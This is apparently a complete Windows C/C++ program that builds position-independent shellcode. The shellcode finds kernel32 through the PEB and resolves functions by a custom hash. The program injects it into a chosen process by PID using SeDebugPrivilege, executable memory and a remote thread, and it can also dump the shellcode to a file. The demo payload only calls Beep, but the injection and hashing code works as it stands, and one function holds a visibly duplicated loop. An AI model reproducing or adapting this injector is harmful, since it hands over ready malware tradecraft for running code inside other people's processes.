#include <stdio.h>
#include <Windows.h>
#include "ntdll.h"
#include <iostream>

typedef BOOL (WINAPI *pBeep)(DWORD Frequency,DWORD Duration);

void WINAPI calcHash()
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_EXPORT_DIRECTORY pIED;

	ULONG i, Hash;
	PUCHAR ptr;

	PULONG Function, Name;
	PUSHORT Ordinal;

	PPEB Peb;
	PLDR_DATA_TABLE_ENTRY Ldr;

	PVOID Kernel32Base;
	char hashChar[20];

	// Get the base address of kernel32

	Peb = NtCurrentPeb();
	Ldr = CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // Get the first entry (process executable)

	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // Second entry (ntdll)
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks.Flink); // kernel32 is located at third entry

	Kernel32Base = Ldr->DllBase;

	pIDH = (PIMAGE_DOS_HEADER)Kernel32Base;
	pINH = (PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base + pIDH->e_lfanew);

	pIED = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	Function = (PULONG)((PUCHAR)Kernel32Base + pIED->AddressOfFunctions);
	Name = (PULONG)((PUCHAR)Kernel32Base + pIED->AddressOfNames);

	Ordinal = (PUSHORT)((PUCHAR)Kernel32Base + pIED->AddressOfNameOrdinals);

	for (i = 0; i < pIED->NumberOfNames; i++)
	{
		Hash = 0;
		ptr = (PUCHAR)Kernel32Base + Name[i];

		for (i = 0; i < pIED->NumberOfNames; i++)
		{
			Hash = 0;
			ptr = (PUCHAR)Kernel32Base + Name[i];

			while (*ptr)
			{
				Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
				ptr++;
			}

			sprintf(hashChar, "%x", Hash);

			std::cout << hashChar << " - " << (char*)Kernel32Base + Name[i] << std::endl;

		}
	}
}

void WINAPI Code()
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_EXPORT_DIRECTORY pIED;

	ULONG i,Hash;
	PUCHAR ptr;

	PULONG Function,Name;
	PUSHORT Ordinal;

	PPEB Peb;
	PLDR_DATA_TABLE_ENTRY Ldr;

	PVOID Kernel32Base;
	pBeep fnBeep=NULL;

	// Get the base address of kernel32

	Peb=NtCurrentPeb();
	Ldr=CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Get the first entry (process executable)

	Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Second entry (ntdll)
	Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // kernel32 is located at third entry

	Kernel32Base=Ldr->DllBase;

	pIDH=(PIMAGE_DOS_HEADER)Kernel32Base;
	pINH=(PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base+pIDH->e_lfanew);

	pIED=(PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	Function=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfFunctions);
	Name=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfNames);

	Ordinal=(PUSHORT)((PUCHAR)Kernel32Base+pIED->AddressOfNameOrdinals);

	for(i=0;i<pIED->NumberOfNames;i++)
	{
		Hash=0;
		ptr=(PUCHAR)Kernel32Base+Name[i];

		// Compute the hash

		while(*ptr)
	    {
		    Hash=((Hash<<8)+Hash+*ptr)^(*ptr<<16);
		    ptr++;
	    }

		if(Hash==0x7586f67c) // Hash of Beep
		{
			fnBeep=(pBeep)((PUCHAR)Kernel32Base+Function[Ordinal[i]]); // Get the function address
			break;
		}
	}

	if(fnBeep)
	{
		fnBeep(400,10000); // Call the Beep function
	}
}

// This is used to calculate the code size

DWORD WINAPI CodeEnd()
{
	return 0;
}

int main(int argc,char* argv[])
{
	HANDLE hProcess,hThread,hFile;

	PVOID mem=NULL;
	ULONG CodeSize=(ULONG)CodeEnd-(ULONG)Code,size=4096,write;

	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;

	NTSTATUS status;
	BOOLEAN bl;
	
	if(argc<2)
	{
		printf("\nUsage:\n");

		printf("\ncode /inject [PID]\n");
		printf("Inject the shellcode into process\n");

		printf("\ncode /dump [Path]\n");
		printf("Dump the shellcode into file\n");

		printf("\ncode /hash\n");
		printf("Print the hashtable into CLI\n");

		return -1;
	}

	if(!stricmp(argv[1],"/inject"))
	{
		RtlAdjustPrivilege(20,TRUE,FALSE,&bl); // Enable SeDebugPrivilege
		
		cid.UniqueProcess=(HANDLE)atoi(argv[2]);
		cid.UniqueThread=NULL;

		InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);
		
		status=NtOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oa,&cid);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to open target process (%#x)\n",status);
			return -1;
		}

		status=NtAllocateVirtualMemory(hProcess,&mem,0,&size,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to allocate memory in target process (%#x)\n",status);

			NtClose(hProcess);
			return -1;
		}

		printf("\nMemory allocated at %#x\n",mem);
		printf("\nShellcode size: %u bytes\n",CodeSize);

		status=NtWriteVirtualMemory(hProcess,mem,Code,CodeSize,NULL);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to write the shellcode into target process (%#x)\n",status);
			size=0;

			NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
			NtClose(hProcess);

			return -1;
		}

		status=RtlCreateUserThread(hProcess,NULL,FALSE,0,0,0,(PUSER_THREAD_START_ROUTINE)mem,NULL,&hThread,NULL);

		if(!NT_SUCCESS(status))
		{
			printf("\nError: Unable to create remote thread in target process (%#x)\n",status);
			size=0;

			NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
			NtClose(hProcess);

			return -1;
		}

		printf("\nThread created\n");
		printf("\nWaiting for thread to terminate\n");

		NtWaitForSingleObject(hThread,FALSE,NULL);
		printf("\nThread terminated\n");

		NtClose(hThread);
		size=0;

		NtFreeVirtualMemory(hProcess,&mem,&size,MEM_RELEASE);
		NtClose(hProcess);

		return 0;
	}

	else if(!stricmp(argv[1],"/dump"))
	{
		hFile=CreateFile(argv[2],GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,0,NULL); // Create the file

		if(hFile==INVALID_HANDLE_VALUE)
		{
			printf("\nError: Unable to create file (%u)\n",GetLastError());
			return -1;
		}

		if(!WriteFile(hFile,Code,CodeSize,&write,NULL)) // Write the shellcode into file
		{
			printf("\nError: Unable to write file (%u)\n",GetLastError());

			NtClose(hFile);
			return -1;
		}

		printf("\nShellcode successfully dumped\n");
		printf("Shellcode size: %u bytes\n",CodeSize);

		NtClose(hFile);
	}

	else if (!stricmp(argv[1], "/hash"))
	{
		calcHash();
	}

	else
	{
		printf("\nError: Invalid arguments\n");
		return -1;
	}

	return 0;
}